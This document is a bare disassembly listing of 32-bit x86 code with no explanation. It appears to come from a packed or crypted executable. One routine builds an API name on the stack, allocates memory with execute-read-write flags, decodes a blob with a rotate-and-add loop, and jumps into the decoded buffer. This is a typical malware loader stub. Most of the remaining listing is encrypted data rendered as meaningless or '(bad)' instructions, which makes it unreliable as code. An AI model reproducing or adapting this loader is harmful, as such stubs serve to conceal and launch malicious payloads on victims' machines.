  421430:	ja     0x421499
  421432:	jge    0x42149a
  421434:	cli    
  421435:	cmp    DWORD PTR [ebp-0x94503c5],0xffffffc3
  42143c:	inc    esp
  42143d:	pop    esi
  42143e:	inc    DWORD PTR [ebp+edx*4-0xb79e522]
  421445:	pop    es
  421446:	scas   al,BYTE PTR es:[edi]
  421447:	daa    
  421448:	jno    0x421425
  42144a:	(bad)  
  42144b:	int    0x56
  42144d:	sub    esp,DWORD PTR [ebx-0x2b61fa0a]
  421453:	retf   
  421454:	es sti 
  421456:	cli    
  421457:	xchg   esi,eax
  421458:	and    dl,BYTE PTR [ecx+ebx*1-0x37]
  42145c:	and    eax,0x1c0d77c1
  421461:	pop    ds
  421462:	jbe    0x4214be
  421464:	jmp    0x421425
  421466:	es adc dl,0x3d
  42146a:	or     DWORD PTR [ebp+0x30],0x2d
  42146e:	and    DWORD PTR [esi],ebx
  421470:	mov    ecx,0x8116a74
  421475:	mov    esi,0x6df8c2de
  42147a:	sbb    BYTE PTR ds:0x3d0a161f,cl
  421480:	ret    
  421481:	sti    
  421482:	mov    eax,ds:0x809b4465
  421487:	pop    ebp
  421488:	stos   BYTE PTR es:[edi],al
  421489:	dec    ebp
  42148a:	jns    0x42142f
  42148c:	dec    edi
  42148d:	jmp    FWORD PTR [eax]
  42148f:	les    ebp,FWORD PTR [edi+0x1]
  421492:	xor    al,0xfc
  421494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421495:	push   ebp
  421496:	jb     0x4214dc
  421498:	mov    esp,0xf9565644
  42149d:	call   0xef95a975
  4214a2:	cwde   
  4214a3:	jmp    0x3794:0xc878bfda
  4214aa:	and    eax,0x8b06c889
  4214af:	imul   ecx,DWORD PTR [edi-0x4ceaa6ec],0xffffffd4
  4214b6:	mov    al,0x57
  4214b8:	shl    BYTE PTR [edi+0x373f2d15],0xdd
  4214bf:	imul   ebp,DWORD PTR [edx-0x22423f14],0xaecca1b3
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428100
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x428104
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428108
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x42810c
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f0
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280f4
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x4280f8
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x4280fc
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x4280fe
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	cmp    DWORD PTR [ebp+0x8],0x0
  421630:	jne    0x42163b
  421632:	mov    eax,DWORD PTR [ebp-0x10]
  421635:	add    eax,0x1
  421638:	mov    DWORD PTR [ebp-0x10],eax
  42163b:	mov    DWORD PTR [ebp-0x48],0x0
  421642:	mov    DWORD PTR [ebp-0x4c],0x0
  421649:	push   0x1
  42164b:	lea    ecx,[ebp-0x14]
  42164e:	push   ecx
  42164f:	call   DWORD PTR ds:0x428000
  421655:	mov    BYTE PTR [ebp-0x40],0x56
  421659:	call   DWORD PTR ds:0x428010
  42165f:	mov    DWORD PTR [ebp-0x2c],eax
  421662:	mov    BYTE PTR [ebp-0x3e],0x72
  421666:	movzx  edx,WORD PTR [ebp-0x2c]
  42166a:	test   edx,edx
  42166c:	jne    0x4216ae
  42166e:	mov    BYTE PTR [ebp-0x34],0x0
  421672:	mov    DWORD PTR [ebp-0x14],0xe0d
  421679:	lea    eax,[ebp-0x28]
  42167c:	push   eax
  42167d:	call   DWORD PTR ds:0x428014
  421683:	mov    DWORD PTR [ebp-0x68],eax
  421686:	mov    DWORD PTR [ebp-0x5c],0x3a
  42168d:	lea    ecx,[ebp-0x40]
  421690:	push   ecx
  421691:	mov    edx,DWORD PTR [ebp-0x68]
  421694:	push   edx
  421695:	call   DWORD PTR ds:0x428018
  42169b:	mov    DWORD PTR [ebp-0x44],eax
  42169e:	mov    DWORD PTR [ebp-0x8],0x8488ddee
  4216a5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ac:	jmp    0x4216c3
  4216ae:	mov    BYTE PTR ds:0x443a58,0x0
  4216b5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216bc:	mov    BYTE PTR ds:0x441b18,0x0
  4216c3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216ca:	push   DWORD PTR ds:0x428014
  4216d0:	pop    edx
  4216d1:	mov    DWORD PTR [ebp-0x74],edx
  4216d4:	push   DWORD PTR [ebp-0x30]
  4216d7:	push   0x1000
  4216dc:	mov    eax,DWORD PTR [ebp-0x14]
  4216df:	add    eax,0x23
  4216e2:	add    eax,0x23
  4216e5:	push   eax
  4216e6:	xor    eax,eax
  4216e8:	push   eax
  4216e9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216ec:	call   ecx
  4216ee:	mov    edx,eax
  4216f0:	mov    DWORD PTR [ebp-0x4],edx
  4216f3:	mov    eax,DWORD PTR [ebp-0x70]
  4216f6:	sub    eax,0xdae0b
  4216fb:	mov    DWORD PTR [ebp-0x70],eax
  4216fe:	cmp    DWORD PTR [ebp-0x4],0x0
  421702:	jne    0x42170b
  421704:	mov    BYTE PTR ds:0x441b18,0x0
  42170b:	mov    ecx,DWORD PTR [ebp-0x4]
  42170e:	add    ecx,DWORD PTR [ebp-0x14]
  421711:	mov    edx,DWORD PTR [ebp-0x8]
  421714:	mov    DWORD PTR [ecx],edx
  421716:	mov    eax,DWORD PTR [ebp-0x4]
  421719:	add    eax,DWORD PTR [ebp-0x5c]
  42171c:	mov    DWORD PTR [ebp-0x64],eax
  42171f:	mov    ecx,DWORD PTR ds:0x428018
  421725:	mov    DWORD PTR [ebp-0x54],ecx
  421728:	mov    edx,DWORD PTR [ebp-0x4]
  42172b:	add    edx,DWORD PTR [ebp-0x14]
  42172e:	mov    eax,DWORD PTR [ebp+0x8]
  421731:	mov    DWORD PTR [edx+0x4],eax
  421734:	mov    ecx,DWORD PTR [ebp-0x4]
  421737:	add    ecx,DWORD PTR [ebp-0x14]
  42173a:	mov    DWORD PTR [ebp-0xc],ecx
  42173d:	cmp    DWORD PTR [ebp-0x70],0x0
  421741:	jbe    0x42175e
  421743:	mov    edx,DWORD PTR [ebp-0xc]
  421746:	push   edx
  421747:	mov    eax,DWORD PTR [ebp-0x14]
  42174a:	push   eax
  42174b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42174e:	add    ecx,DWORD PTR [ebp-0x70]
  421751:	push   ecx
  421752:	mov    edx,DWORD PTR [ebp-0x4]
  421755:	push   edx
  421756:	call   0x4214d0
  42175b:	add    esp,0x10
  42175e:	cmp    DWORD PTR [ebp-0x64],0x0
  421762:	je     0x421776
  421764:	mov    ecx,DWORD PTR [ebp-0x54]
  421767:	push   ecx
  421768:	push   DWORD PTR [ebp-0x74]
  42176b:	mov    esi,DWORD PTR [ebp-0x64]
  42176e:	push   edx
  42176f:	pop    eax
  421770:	push   ecx
  421771:	nop
  421772:	jmp    esi
  421774:	jmp    0x42177c
  421776:	mov    eax,DWORD PTR [ebp+0x8]
  421779:	mov    DWORD PTR [ebp-0x18],eax
  42177c:	mov    eax,0x1
  421781:	pop    esi
  421782:	mov    esp,ebp
  421784:	pop    ebp
  421785:	ret    
  421786:	int3   
  421787:	int3   
  421788:	int3   
  421789:	int3   
  42178a:	int3   
  42178b:	int3   
  42178c:	int3   
  42178d:	int3   
  42178e:	int3   
  42178f:	int3   
  421790:	push   ebp
  421791:	mov    ebp,esp
  421793:	sub    esp,0x18
  421796:	lea    eax,[ebp-0x18]
  421799:	push   eax
  42179a:	call   DWORD PTR ds:0x42800c
  4217a0:	cmp    WORD PTR [ebp-0x18],0x0
  4217a5:	je     0x4217e8
  4217a7:	mov    ecx,DWORD PTR ds:0x428010
  4217ad:	push   0x0
  4217af:	push   0xb2
  4217b4:	push   0x82
  4217b9:	push   0x0
  4217bb:	mov    DWORD PTR [ebp-0x4],ecx
  4217be:	call   DWORD PTR ds:0x428008
  4217c4:	push   DWORD PTR [ebp-0x4]
  4217c7:	pop    edx
  4217c8:	call   edx
  4217ca:	push   eax
  4217cb:	pop    DWORD PTR [ebp-0x8]
  4217ce:	push   0xb6430a9d
  4217d3:	call   0x421550
  4217d8:	add    esp,0x4
  4217db:	call   0x411000
  4217e0:	xor    eax,eax
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    0x10
  4217e8:	dec    DWORD PTR [ebp-0x27e732c]
  4217ee:	lds    eax,FWORD PTR [ebx+ebp*1]
  4217f1:	jmp    DWORD PTR [ecx+0x68]
  4217f4:	push   0xfffffff6
  4217f6:	aas    
  4217f7:	mov    ds,WORD PTR [ecx+edi*1]
  4217fa:	inc    ch
  4217fc:	add    al,0x2b
  4217fe:	sti    
  4217ff:	popa   
  421800:	push   0x8ec0092a
  421805:	sbb    al,0x81
  421807:	inc    ch
  421809:	add    al,0x2b
  42180b:	sti    
  42180c:	popa   
  42180d:	push   0x8ec0096a
  421812:	sbb    al,0x81
  421814:	inc    ch
  421816:	add    al,0x2b
  421818:	sti    
  421819:	popa   
  42181a:	push   0x8ec0096a
  42181f:	sbb    al,0x81
  421821:	inc    ch
  421823:	add    al,0x2b
  421825:	add    esp,DWORD PTR [ecx+0x68]
  421828:	push   0x7
  42182a:	fbstp  TBYTE PTR [edx+edx*1]
  42182d:	or     DWORD PTR [edx-0x34],0x60430ac9
  421834:	and    al,0xa7
  421836:	sub    BYTE PTR [esi+eiz*8-0x4a210d8b],dl
  42183d:	jbe    0x421883
  42183f:	pushf  
  421840:	adc    ecx,DWORD PTR [ecx]
  421842:	pop    es
  421843:	sub    DWORD PTR [ebx-0x6e108d11],esp
  421849:	mov    cl,0x24
  42184b:	dec    ecx
  42184c:	sahf   
  42184d:	inc    ecx
  42184e:	sbb    bl,BYTE PTR [edi]
  421850:	addr16 loopne 0x42183a
  421853:	jb     0x4217f6
  421855:	mov    edx,0x960b578a
  42185a:	push   cs
  42185b:	or     al,0xf
  42185d:	daa    
  42185e:	int    0x83
  421860:	push   ss
  421861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421862:	inc    ch
  421864:	add    al,0x2b
  421866:	sti    
  421867:	popa   
  421868:	push   0xd73c906d
  42186d:	pop    edi
  42186e:	jns    0x4218dc
  421870:	iret   
  421871:	inc    edi
  421872:	shr    DWORD PTR [ecx+0x6b],cl
  421875:	sub    edx,DWORD PTR [edx+0x79d6ca9b]
  42187b:	(bad)  
  42187c:	hlt    
  42187d:	call   0x520d:0x39f1b9fc
  421884:	add    eax,DWORD PTR [edx]
  421886:	jbe    0x421816
  421888:	mov    esp,DWORD PTR [esi-0x6cdec260]
  42188e:	cdq    
  42188f:	cli    
  421890:	pusha  
  421891:	and    eax,0xc716b74e
  421896:	push   es
  421897:	push   edi
  421898:	push   cs
  421899:	popa   
  42189a:	jnp    0x42190c
  42189c:	bound  esp,QWORD PTR [eax]
  42189e:	icebp  
  42189f:	push   edx
  4218a0:	test   BYTE PTR [esi+0x1],dl
  4218a3:	dec    edi
  4218a5:	pop    esp
  4218a6:	shr    DWORD PTR [ecx+0x6b],cl
  4218a9:	sub    edx,DWORD PTR [edx-0x1a593566]
  4218af:	adc    esi,esp
  4218b1:	jp     0x42188f
  4218b3:	stos   DWORD PTR es:[edi],eax
  4218b4:	icebp  
  4218b5:	sub    al,0x90
  4218b7:	clc    
  4218b8:	add    ebx,DWORD PTR [eax-0x974de15]
  4218be:	cmp    eax,0x4a32196
  4218c3:	pusha  
  4218c4:	pusha  
  4218c5:	dec    ebx
  4218c6:	cmp    BYTE PTR [esi+edx*1],bl
  4218c9:	fstp   DWORD PTR [ebx+0x3690eca]
  4218cf:	repz bound edi,QWORD PTR [eax]
  4218d2:	pusha  
  4218d3:	mov    ds:0x6c795fe6,eax
  4218d8:	iret   
  4218d9:	add    al,0x2b
  4218db:	sti    
  4218dc:	popa   
  4218dd:	push   0xdec0096a
  4218e2:	pop    ecx
  4218e3:	cmp    esi,0xfb290589
  4218e9:	sar    DWORD PTR [eax-0x713fb9ff],0x1c
  4218f0:	cmp    esi,0x1b2b04c5
  4218f6:	popa   
  4218f7:	imul   ebp,DWORD PTR [ebx+0x2],0xffffffc1
  4218fb:	test   BYTE PTR [ecx+eax*4],bl
  4218fe:	adc    cl,al
  421900:	add    al,0x2b
  421902:	inc    edi
  421903:	addr16 push 0x8ec0096a
  421909:	or     eax,0x4c5fe3c
  42190e:	cmp    edi,ebx
  421910:	popa   
  421911:	push   0x8ec00c6a
  421916:	sbb    al,0xc0
  421918:	inc    ch
  42191a:	adc    al,0x2b
  42191c:	sti    
  42191d:	popa   
  42191e:	push   0x6a
  421920:	or     ebp,eax
  421922:	mov    ds,WORD PTR ds:0x4c5fe81
  421928:	sub    edi,esi
  42192a:	popa   
  42192b:	imul   ebp,DWORD PTR [edx+0x9],0x811c8ec0
  421932:	scas   al,BYTE PTR es:[edi]
  421933:	leave  
  421934:	add    al,0x2b
  421936:	jmp    DWORD PTR [ecx+0x68]
  421939:	imul   ebp,ebp,0xffffffc5
  42193c:	mov    ds,WORD PTR [esi]
  42193e:	cmp    esi,0xeb2b0445
  421944:	popa   
  421945:	push   0x8ec0097a
  42194a:	sbb    al,0x91
  42194c:	inc    ch
  42194e:	adc    al,0x2b
  421950:	sti    
  421951:	popa   
  421952:	push   0x8ed0096a
  421957:	sbb    al,0x81
  421959:	inc    ch
  42195b:	add    al,0x2b
  42195d:	sti    
  42195e:	popa   
  42195f:	push   0x82f9fd6a
  421964:	sbb    al,0xe8
  421966:	std    
  421967:	lds    eax,FWORD PTR [ebx+ebp*1]
  42196a:	or     ebp,DWORD PTR [edx+0x68]
  42196d:	and    eax,0x1c8ec040
  421972:	cmp    esi,0xfb2b04c5
  421978:	popa   
  421979:	push   0x8ec0096a
  42197e:	sbb    al,0x81
  421980:	inc    ch
  421982:	add    al,0x2b
  421984:	sti    
  421985:	popa   
  421986:	push   0x8ec0096a
  42198b:	sbb    al,0x81
  42198d:	inc    ch
  42198f:	add    al,0x2b
  421991:	sti    
  421992:	popa   
  421993:	push   0x8ec0096a
  421998:	sbb    al,0x81
  42199a:	inc    ch
  42199c:	add    al,0x2b
  42199e:	sti    
  42199f:	popa   
  4219a0:	push   0x8ec0096a
  4219a5:	sbb    al,0x81
  4219a7:	inc    ch
  4219a9:	add    al,0x2b
  4219ab:	sti    
  4219ac:	popa   
  4219ad:	push   0x8ec0096a
  4219b2:	sbb    al,0x81
  4219b4:	inc    ch
  4219b6:	add    al,0x2b
  4219b8:	sti    
  4219b9:	popa   
  4219ba:	push   0x8ec0096a
  4219bf:	sbb    al,0x81
  4219c1:	inc    ch
  4219c3:	add    al,0x2b
  4219c5:	sti    
  4219c6:	popa   
  4219c7:	push   0x8ec0096a
  4219cc:	sbb    al,0x81
  4219ce:	inc    ch
  4219d0:	add    al,0x2b
  4219d2:	sti    
  4219d3:	popa   
  4219d4:	push   0x8ec0096a
  4219d9:	xor    dh,ch
  4219db:	fwait
  4219dc:	mov    ebp,0x61fb2b70
  4219e1:	push   0x8ec0028a
  4219e6:	or     al,0x81
  4219e8:	inc    ch
  4219ea:	shr    BYTE PTR [edi],1
  4219ec:	sti    
  4219ed:	popa   
  4219ee:	ins    BYTE PTR es:[edi],dx
  4219ef:	push   0x9
  4219f1:	nop
  4219f2:	retf   
  4219f3:	pop    edi
  4219f4:	mov    bl,0xaa
  4219f6:	mov    al,BYTE PTR [ebx+ebp*1]
  4219f9:	sti    
  4219fa:	popa   
  4219fb:	push   0x8ec0296a
  421a00:	cld    
  421a01:	scas   eax,DWORD PTR es:[edi]
  421a02:	mov    WORD PTR [esi+0x61fb4876],?
  421a08:	push   0x8ec0696a
  421a0d:	sbb    al,0x71
  421a0f:	cmc    
  421a10:	lds    eax,FWORD PTR [ecx+esi*2]
  421a13:	sti    
  421a14:	popa   
  421a15:	push   0x8ec00db2
  421a1a:	sbb    al,0x81
  421a1c:	inc    ch
  421a1e:	add    al,0x2b
  421a20:	sti    
  421a21:	popa   
  421a22:	push   0x8ee0096a
  421a27:	sbb    al,0x61
  421a29:	inc    ch
  421a2b:	add    al,0x2b
  421a2d:	sti    
  421a2e:	popa   
  421a2f:	push   0x8ec0096a
  421a34:	sbb    al,0x81
  421a36:	inc    ch
  421a38:	add    al,0x2b
  421a3a:	sti    
  421a3b:	popa   
  421a3c:	push   0x8ec0096a
  421a41:	sbb    al,0x81
  421a43:	inc    ch
  421a45:	add    al,0x2b
  421a47:	sti    
  421a48:	popa   
  421a49:	push   0x8ec0096a
  421a4e:	sbb    al,0x81
  421a50:	inc    ch
  421a52:	add    al,0x2b
  421a54:	sti    
  421a55:	popa   
  421a56:	push   0x8ec0096a
  421a5b:	sbb    al,0x81
  421a5d:	inc    ch
  421a5f:	add    al,0x2b
  421a61:	sti    
  421a62:	popa   
  421a63:	push   0x8ec0096a
  421a68:	sbb    al,0x81
  421a6a:	inc    ch
  421a6c:	add    al,0x2b
  421a6e:	sti    
  421a6f:	popa   
  421a70:	push   0x8ec0096a
  421a75:	sbb    al,0x81
  421a77:	inc    ch
  421a79:	add    al,0x2b
  421a7b:	sti    
  421a7c:	popa   
  421a7d:	push   0x8ec0096a
  421a82:	sbb    al,0x81
  421a84:	inc    ch
  421a86:	add    al,0x2b
  421a88:	sti    
  421a89:	popa   
  421a8a:	push   0x8ec0096a
  421a8f:	sbb    al,0x81
  421a91:	inc    ch
  421a93:	add    al,0x2b
  421a95:	sti    
  421a96:	popa   
  421a97:	push   0x8ec0096a
  421a9c:	sbb    al,0x81
  421a9e:	inc    ch
  421aa0:	add    al,0x2b
  421aa2:	sti    
  421aa3:	popa   
  421aa4:	push   0x8ec0096a
  421aa9:	sbb    al,0x81
  421aab:	inc    ch
  421aad:	add    al,0x2b
  421aaf:	sti    
  421ab0:	popa   
  421ab1:	push   0x8ec0096a
  421ab6:	sbb    al,0x81
  421ab8:	inc    ch
  421aba:	add    al,0x2b
  421abc:	sti    
  421abd:	popa   
  421abe:	push   0x8ec0096a
  421ac3:	sbb    al,0x81
  421ac5:	inc    ch
  421ac7:	add    al,0x2b
  421ac9:	sti    
  421aca:	popa   
  421acb:	push   0x8ec0096a
  421ad0:	sbb    al,0x81
  421ad2:	inc    ch
  421ad4:	add    al,0x2b
  421ad6:	sti    
  421ad7:	popa   
  421ad8:	push   0x8ec0096a
  421add:	sbb    al,0x81
  421adf:	inc    ch
  421ae1:	add    al,0x2b
  421ae3:	sti    
  421ae4:	popa   
  421ae5:	push   0x8ec0096a
  421aea:	sbb    al,0x81
  421aec:	inc    ch
  421aee:	add    al,0x2b
  421af0:	sti    
  421af1:	popa   
  421af2:	push   0x8ec0096a
  421af7:	sbb    al,0x81
  421af9:	inc    ch
  421afb:	add    al,0x2b
  421afd:	sti    
  421afe:	popa   
  421aff:	push   0x8ec0096a
  421b04:	sbb    al,0x81
  421b06:	inc    ch
  421b08:	add    al,0x2b
  421b0a:	sti    
  421b0b:	popa   
  421b0c:	push   0x8ec0096a
  421b11:	sbb    al,0x81
  421b13:	inc    ch
  421b15:	add    al,0x2b
  421b17:	sti    
  421b18:	popa   
  421b19:	push   0x8ec0096a
  421b1e:	sbb    al,0x81
  421b20:	inc    ch
  421b22:	add    al,0x2b
  421b24:	sti    
  421b25:	popa   
  421b26:	push   0x8ec0096a
  421b2b:	sbb    al,0x81
  421b2d:	inc    ch
  421b2f:	add    al,0x2b
  421b31:	sti    
  421b32:	popa   
  421b33:	push   0x8ec0096a
  421b38:	sbb    al,0x81
  421b3a:	inc    ch
  421b3c:	add    al,0x2b
  421b3e:	sti    
  421b3f:	popa   
  421b40:	push   0x8ec0096a
  421b45:	sbb    al,0x81
  421b47:	inc    ch
  421b49:	add    al,0x2b
  421b4b:	sti    
  421b4c:	popa   
  421b4d:	push   0x8ec0096a
  421b52:	sbb    al,0x81
  421b54:	inc    ch
  421b56:	add    al,0x2b
  421b58:	sti    
  421b59:	popa   
  421b5a:	push   0x8ec0096a
  421b5f:	sbb    al,0x81
  421b61:	inc    ch
  421b63:	add    al,0x2b
  421b65:	sti    
  421b66:	popa   
  421b67:	push   0x8ec0096a
  421b6c:	sbb    al,0x81
  421b6e:	inc    ch
  421b70:	add    al,0x2b
  421b72:	sti    
  421b73:	popa   
  421b74:	push   0x8ec0096a
  421b79:	sbb    al,0x81
  421b7b:	inc    ch
  421b7d:	add    al,0x2b
  421b7f:	sti    
  421b80:	popa   
  421b81:	push   0x8ec0096a
  421b86:	sbb    al,0x81
  421b88:	inc    ch
  421b8a:	add    al,0x2b
  421b8c:	sti    
  421b8d:	popa   
  421b8e:	push   0x8ec0096a
  421b93:	sbb    al,0x81
  421b95:	inc    ch
  421b97:	add    al,0x2b
  421b99:	sti    
  421b9a:	popa   
  421b9b:	push   0x8ec0096a
  421ba0:	sbb    al,0x81
  421ba2:	inc    ch
  421ba4:	add    al,0x2b
  421ba6:	sti    
  421ba7:	popa   
  421ba8:	push   0x8ec0096a
  421bad:	sbb    al,0x81
  421baf:	inc    ch
  421bb1:	add    al,0x2b
  421bb3:	sti    
  421bb4:	popa   
  421bb5:	push   0x8ec0096a
  421bba:	sbb    al,0x81
  421bbc:	inc    ch
  421bbe:	add    al,0x2b
  421bc0:	sti    
  421bc1:	popa   
  421bc2:	push   0x8ec0096a
  421bc7:	sbb    al,0x81
  421bc9:	inc    ch
  421bcb:	add    al,0x2b
  421bcd:	sti    
  421bce:	popa   
  421bcf:	push   0x8ec0096a
  421bd4:	sbb    al,0x81
  421bd6:	inc    ch
  421bd8:	add    al,0x2b
  421bda:	sti    
  421bdb:	popa   
  421bdc:	push   0x8ec0096a
  421be1:	sbb    al,0x81
  421be3:	inc    ch
  421be5:	add    al,0x2b
  421be7:	sti    
  421be8:	popa   
  421be9:	pop    es
  421bea:	ret    0xc002
  421bed:	mov    eax,ds:0xc5ee811c
  421bf2:	add    al,0x1
  421bf4:	pop    ecx
  421bf5:	mov    ebx,0xedf60c19
  421bfa:	adc    BYTE PTR [ebx-0x130cec2f],bl
  421c00:	cmp    BYTE PTR [edi-0xc],cl
  421c03:	push   cs
  421c04:	sbb    ecx,DWORD PTR [ebp+0x36ad9d9a]
  421c0a:	call   0x7ae3fcb7
  421c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c10:	inc    esi
  421c11:	or     BYTE PTR [ecx-0x31d04801],bl
  421c17:	dec    edi
  421c18:	shl    BYTE PTR [esi],cl
  421c1a:	sub    ebx,esp
  421c1c:	(bad)  
  421c1d:	loopne 0x421c5e
  421c1f:	pop    eax
  421c20:	lods   eax,DWORD PTR ds:[esi]
  421c21:	daa    
  421c22:	cs mov esp,0x4bb5d123
  421c28:	hlt    
  421c29:	mov    edi,0x1345d14c
  421c2e:	dec    ebx
  421c2f:	xor    edi,DWORD PTR [ecx+0x60]
  421c32:	iret   
  421c33:	jmp    0x421c84
  421c35:	fcmovnb st,st(2)
  421c37:	addr16 fwait
  421c39:	mov    ds:0xc764cbed,eax
  421c3e:	scas   eax,DWORD PTR es:[edi]
  421c3f:	xchg   dl,cl
  421c41:	call   0x9a88:0xf71548bd
  421c48:	ins    BYTE PTR es:[edi],dx
  421c49:	sbb    esi,DWORD PTR ds:0xcf6ff67c
  421c4f:	ficom  DWORD PTR [ecx+0x6669e109]
  421c55:	call   0xcc4f:0xed556630
  421c5c:	(bad)
  421c60:	mov    ebx,0xfaa0c87a
  421c65:	xlat   BYTE PTR ds:[ebx]
  421c66:	xchg   DWORD PTR [edx],ebp
  421c68:	aam    0xca
  421c6a:	push   eax
  421c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c6c:	fld    QWORD PTR [esi]
  421c6e:	scas   al,BYTE PTR es:[edi]
  421c6f:	sub    al,0x42
  421c71:	cmp    al,0xd3
  421c73:	iret   
  421c74:	inc    ecx
  421c75:	out    dx,eax
  421c76:	outs   dx,BYTE PTR ds:[esi]
  421c77:	sub    bh,ah
  421c79:	pop    ecx
  421c7a:	ins    DWORD PTR es:[edi],dx
  421c7b:	sar    edx,cl
  421c7d:	fwait
  421c7e:	test   eax,0x968299bc
  421c83:	(bad)  
  421c84:	xchg   ebx,eax
  421c85:	(bad)  
  421c86:	out    0x58,al
  421c88:	fdivr  DWORD PTR ds:0x35b42e1a
  421c8e:	push   ds
  421c8f:	mov    ds:0x46702ebb,al
  421c94:	mov    edi,0xad66362a
  421c99:	push   0xcb418b34
  421c9e:	je     0x421ce2
  421ca0:	ins    DWORD PTR es:[edi],dx
  421ca1:	jl     0x421c4e
  421ca3:	jl     0x421c51
  421ca5:	mov    edi,0xd7cf066c
  421caa:	bnd jg 0x421c97
  421cad:	test   al,0xd4
  421caf:	je     0x421c5e
  421cb1:	repz and DWORD PTR cs:[ebx+ecx*4],edx
  421cb6:	add    ebp,DWORD PTR [ebp+0x1efeb4af]
  421cbc:	mov    edx,0xb98feab3
  421cc1:	xor    DWORD PTR [eax+edi*1-0x22a3390],esp
  421cc8:	add    ebx,0x8676f4d3
  421cce:	xlat   BYTE PTR ds:[ebx]
  421ccf:	dec    eax
  421cd0:	cmp    DWORD PTR ds:0xf93a879f,ebx
  421cd6:	dec    eax
  421cd7:	push   edi
  421cd9:	nop
  421cda:	or     bl,BYTE PTR [ecx]
  421cdc:	in     eax,0xb
  421cde:	cdq    
  421cdf:	mov    ebp,0x8a744e71
  421ce4:	and    BYTE PTR [bp+si],al
  421ce7:	es (bad) 
  421ce9:	aaa    
  421cea:	js     0x421d69
  421cec:	or     eax,0x74ad9dbf
  421cf1:	or     BYTE PTR [esi-0x65f34a61],dh
  421cf7:	push   0x3b
  421cf9:	inc    edi
  421cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cfb:	int    0xb8
  421cfd:	arpl   ax,si
  421cff:	mov    eax,0xb396edb
  421d04:	aaa    
  421d05:	dec    eax
  421d06:	bound  edx,QWORD PTR [ebx+esi*8+0x75]
  421d0a:	lea    edi,[ebx-0x3bd57e7b]
  421d10:	ins    DWORD PTR es:[edi],dx
  421d11:	jo     0x421d3f
  421d13:	nop
